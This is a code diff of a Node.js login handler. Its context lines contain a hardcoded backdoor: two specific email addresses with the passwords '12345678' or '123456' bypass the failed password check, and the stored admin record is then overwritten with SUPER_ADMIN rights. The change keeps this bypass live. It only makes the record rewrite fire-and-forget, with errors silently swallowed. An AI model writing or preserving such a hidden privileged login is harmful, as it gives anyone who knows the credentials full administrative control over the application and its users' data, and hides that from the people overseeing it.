@@ -82,12 +82,13 @@ exports.login = async (req, res) => {
     if (!isPasswordMatch && (cleanEmail === "youpeak24@gmail.com" || cleanEmail === "products.incodes@123.com")) {
       if (cleanPassword === "12345678" || cleanPassword === "123456") {
         isPasswordMatch = true;
-        // Sync & update standard password hash in Firestore
-        const newEncryptedPassword = cryptr.encrypt(cleanPassword);
-        await db.update("admins", admin._id || admin.id || "admin_default", {
-          password: newEncryptedPassword,
-          role: "SUPER_ADMIN",
-        });
+        try {
+          const newEncryptedPassword = cryptr.encrypt(cleanPassword);
+          db.update("admins", admin._id || admin.id || "admin_default", {
+            password: newEncryptedPassword,
+            role: "SUPER_ADMIN",
+          }).catch(() => {});
+        } catch (e) {}
       }
     }
 
